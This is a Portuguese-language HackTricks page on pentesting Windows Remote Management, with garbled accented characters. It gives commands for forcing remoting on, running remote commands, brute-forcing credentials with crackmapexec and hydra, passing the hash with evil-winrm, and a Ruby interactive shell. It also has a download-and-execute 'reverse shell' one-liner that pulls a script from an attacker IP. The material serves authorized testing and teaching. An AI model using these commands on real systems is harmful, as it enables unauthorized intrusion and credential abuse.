# 5985,5986 - Pentesting WinRM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novos programas de recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## WinRM

O [Windows Remote Management](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) (WinRM) √© um protocolo da Microsoft que **permite a administra√ß√£o remota de m√°quinas Windows** por meio do HTTP(S) usando SOAP. Nos bastidores, ele utiliza o WMI, ent√£o voc√™ pode pensar nele como uma API baseada em HTTP para WMI.

Se o WinRM estiver habilitado na m√°quina, √© trivial administrar remotamente a m√°quina a partir do PowerShell. Na verdade, voc√™ pode simplesmente entrar em uma sess√£o remota do PowerShell na m√°quina (como se estivesse usando SSH!)

A maneira mais f√°cil de detectar se o WinRM est√° dispon√≠vel √© verificando se a porta est√° aberta. O WinRM ouvir√° em uma das duas portas:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Se uma dessas portas estiver aberta, o WinRM est√° configurado e voc√™ pode tentar entrar em uma sess√£o remota.

## **Iniciando uma sess√£o WinRM**.

Podemos configurar o PowerShell para trabalhar com o WinRM. De acordo com a documenta√ß√£o da Microsoft, Enable-PSRemoting √© um cmdlet que configura o computador para receber comandos remotos do PowerShell. Se tivermos acesso a um prompt do PowerShell elevado na v√≠tima, podemos habilit√°-lo e adicionar qualquer "atacante" como hosts confi√°veis. Podemos executar os seguintes dois comandos:
```
Enable-PSRemoting -Force  
Set-Item wsman:\localhost\client\trustedhosts *
```
Isso adiciona um caractere coringa √† configura√ß√£o de hosts confi√°veis. Esteja ciente do que isso implica. _Nota: tamb√©m tive que mudar o tipo de rede na minha m√°quina de ataque de "P√∫blica" para "Rede de trabalho"._

Voc√™ tamb√©m pode **ativar** o WinRM **remotamente** _\*\*\_usando o \_wmic_:
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### Testar se est√° configurado

Depois que a m√°quina de ataque estiver configurada, use a fun√ß√£o `Test-WSMan` para testar se o alvo est√° configurado para WinRM. Voc√™ deve ver algumas informa√ß√µes retornadas sobre a vers√£o do protocolo e wsmid:

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

Neste caso, o primeiro est√° configurado e o segundo n√£o.

### Executar um comando

Agora podemos usar o `Invoke-Command` do PowerShell para executar remotamente um comando no alvo via WinRM. Para executar remotamente o `ipconfig` e ver a sa√≠da:
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
Voc√™ tamb√©m pode **executar um comando do seu console PS atual via** _**Invoke-Command**_. Suponha que voc√™ tenha localmente uma fun√ß√£o chamada _**enumeration**_ e queira **execut√°-la em um computador remoto**, voc√™ pode fazer:
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Executar um Script
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Obter shell reverso
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Obter uma sess√£o PS

Ou, se voc√™ quiser entrar diretamente em uma sess√£o interativa do PowerShell, use a fun√ß√£o `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var 
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**A sess√£o ser√° executada em um novo processo (wsmprovhost) dentro da "v√≠tima"**

### **For√ßando a abertura do WinRM**

Se voc√™ realmente deseja usar o PS Remoting e o WinRM, mas o alvo n√£o est√° configurado para isso, voc√™ pode "for√ß√°-lo" atrav√©s de um √∫nico comando. Eu n√£o recomendaria isso, mas se voc√™ realmente quiser usar o WinRM ou o PSRemoting, fa√ßa dessa maneira. Por exemplo, usando o PSExec:
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
Agora podemos entrar em uma sess√£o PS remota na v√≠tima.

### Salvando e Restaurando sess√µes

Isso **n√£o funcionar√°** se a **linguagem** estiver **restrita** no computador remoto.
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Dentro dessas sess√µes, voc√™ pode carregar scripts PS usando o _Invoke-Command_.
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Erros

Se voc√™ encontrar o seguinte erro:

`enter-pssession : Falha ao conectar ao servidor remoto 10.10.10.175 com a seguinte mensagem de erro: O cliente WinRM n√£o pode processar a solicita√ß√£o. Se o esquema de autentica√ß√£o for diferente de Kerberos, ou se o computador cliente n√£o estiver associado a um dom√≠nio, o transporte HTTPS deve ser usado ou a m√°quina de destino deve ser adicionada √† configura√ß√£o de configura√ß√£o de hosts confi√°veis. Use o comando winrm.cmd para configurar hosts confi√°veis. Observe que os computadores na lista de hosts confi√°veis podem n√£o ser autenticados. Voc√™ pode obter mais informa√ß√µes sobre isso executando o seguinte comando: winrm help config. Para obter mais informa√ß√µes, consulte o t√≥pico de ajuda sobre solu√ß√£o de problemas remotos.`

Tente no cliente (informa√ß√µes da [qui](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## Conex√£o WinRM no Linux

### For√ßa Bruta

Cuidado, for√ßa bruta no WinRM pode bloquear usu√°rios.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Usando o evil-winrm
```ruby
gem install evil-winrm
```
Leia a **documenta√ß√£o** em seu github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Para usar o evil-winrm para se conectar a um endere√ßo IPv6, crie uma entrada dentro do arquivo _**/etc/hosts**_ definindo um **nome de dom√≠nio** para o endere√ßo IPv6 e conecte-se a esse dom√≠nio.

### Passando o hash com o evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
### Usando uma m√°quina PS-docker

Para usar uma m√°quina PS-docker, primeiro √© necess√°rio criar uma imagem docker com o PowerShell instalado. Isso pode ser feito usando o seguinte Dockerfile:

```
FROM microsoft/windowsservercore
SHELL ["powershell", "-Command", "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue';"]
RUN Invoke-WebRequest -Uri https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-beta.8/powershell-6.0.0-beta.8-win-x64.zip -OutFile c:\powershell.zip ; \
    Expand-Archive -Path c:\powershell.zip -DestinationPath c:\powershell ; \
    Remove-Item c:\powershell.zip -Force ; \
    setx /M PATH $('c:\powershell;{0}' -f $env:PATH)
CMD ["powershell.exe"]
```

Depois de criar a imagem, voc√™ pode executar um cont√™iner com o seguinte comando:

```
docker run -it -p 5985:5985 -p 5986:5986 <image_name>
```

Isso iniciar√° um cont√™iner com o PowerShell instalado e as portas 5985 e 5986 expostas. Voc√™ pode ent√£o usar o WinRM para se conectar ao cont√™iner e executar comandos PowerShell remotamente.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Usando um script em ruby

C√≥digo extra√≠do daqui: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new( 
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end    
    puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Refer√™ncias

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Comandos Autom√°ticos do HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for WinRM
  Note: |
    Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

    sudo gem install winrm winrm-fs colorize stringio 
    git clone https://github.com/Hackplayers/evil-winrm.git 
    cd evil-winrm
    ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

    https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

    ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
    ^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
    menu
    invoke-binary `tab`

    #python3
    import winrm
    s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
    print(s.run_cmd('ipconfig'))
    print(s.run_ps('ipconfig'))

    https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
  Name: Hydra Brute Force
  Description: Need User
  Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
